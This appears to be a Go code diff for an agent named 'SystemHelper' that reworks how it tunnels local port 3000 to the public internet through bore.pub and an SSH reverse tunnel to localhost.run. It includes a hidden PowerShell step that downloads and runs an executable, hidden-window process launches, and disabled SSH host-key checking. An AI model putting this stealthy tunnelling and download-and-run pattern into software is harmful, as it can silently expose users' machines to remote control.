@@ -208,6 +208,8 @@ var (
 
 func main() {
 	runtime.LockOSThread()
+	fmt.Println("SystemHelper v" + Version + " starting...")
+	fmt.Println("Logs: " + filepath.Join(dataDir(), "agent.log"))
 	
 	// Check for --server flag (manual server mode)
 	useMode := ""
@@ -680,24 +682,7 @@ func startTunnel(ws *websocket.Conn) {
 	go func() {
 		var url string
 		
-		// Try localhost.run (SSH, no install needed)
-		if tunnelMode == "auto" || tunnelMode == "localhost.run" {
-			log("Trying localhost.run...")
-			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
-				"-o", "ConnectTimeout=10",
-				"-R", "80:localhost:3000", "localhost.run")
-			hideCmd(cmd)
-			out, _ := cmd.CombinedOutput()
-			output := string(out)
-			for _, line := range strings.Split(output, "\n") {
-				if strings.Contains(line, "https") && strings.Contains(line, "localhost.run") {
-					url = strings.TrimSpace(line)
-					break
-				}
-			}
-		}
-		
-		// Try bore.pub if localhost.run failed
+		// Try bore.pub FIRST (no SSH needed, reliable on Windows)
 		if url == "" && (tunnelMode == "auto" || tunnelMode == "bore") {
 			log("Trying bore.pub...")
 			borePath := filepath.Join(dataDir(), "bore.exe")
@@ -708,21 +693,59 @@ func startTunnel(ws *websocket.Conn) {
 					filepath.Join(dataDir(), "bore.zip")+"' ; Expand-Archive '"+filepath.Join(dataDir(), "bore.zip")+"' -DestinationPath '"+
 					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
 				hideCmd(dl)
-				dl.Run()
+				if err := dl.Run(); err != nil {
+					log("bore download failed: " + err.Error())
+				}
 			}
 			if _, err := os.Stat(borePath); err == nil {
-				// bore is non-blocking, runs in background
 				cmd := exec.Command(borePath, "local", "3000", "--to", "bore.pub")
 				hideCmd(cmd)
 				stdout, _ := cmd.StdoutPipe()
-				cmd.Start()
-				
-				// Read first line of output for URL
-				buf := make([]byte, 256)
-				n, _ := stdout.Read(buf)
-				url = strings.TrimSpace(string(buf[:n]))
-				if url != "" && !strings.HasPrefix(url, "http") {
-					url = "http://bore.pub:" + strings.TrimSpace(strings.Split(url, " ")[0])
+				if err := cmd.Start(); err != nil {
+					log("bore start failed: " + err.Error())
+				} else {
+					buf := make([]byte, 256)
+					n, _ := stdout.Read(buf)
+					outLine := strings.TrimSpace(string(buf[:n]))
+					if strings.Contains(outLine, ":") {
+						port := strings.TrimSpace(strings.Split(outLine, " ")[0])
+						url = "http://bore.pub:" + port
+					}
+					if url == "" && outLine != "" {
+						url = outLine
+					}
+				}
+			}
+		}
+		
+		// Try localhost.run (SSH) as fallback – use Start() + pipe with timeout
+		if url == "" && (tunnelMode == "auto" || tunnelMode == "localhost.run") {
+			log("Trying localhost.run...")
+			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
+				"-o", "ConnectTimeout=10",
+				"-R", "80:localhost:3000", "localhost.run")
+			hideCmd(cmd)
+			stdout, _ := cmd.StdoutPipe()
+			if err := cmd.Start(); err != nil {
+				log("localhost.run start failed: " + err.Error())
+			} else {
+				// Read first URL line within 15 seconds, then let SSH run in background
+				done := make(chan string, 1)
+				go func() {
+					buf := make([]byte, 4096)
+					n, _ := stdout.Read(buf)
+					done <- string(buf[:n])
+				}()
+				select {
+				case out := <-done:
+					for _, line := range strings.Split(out, "\n") {
+						if strings.Contains(line, "https") && strings.Contains(line, "localhost.run") {
+							url = strings.TrimSpace(line)
+							break
+						}
+					}
+				case <-time.After(15 * time.Second):
+					log("localhost.run: timeout waiting for URL")
 				}
 			}
 		}
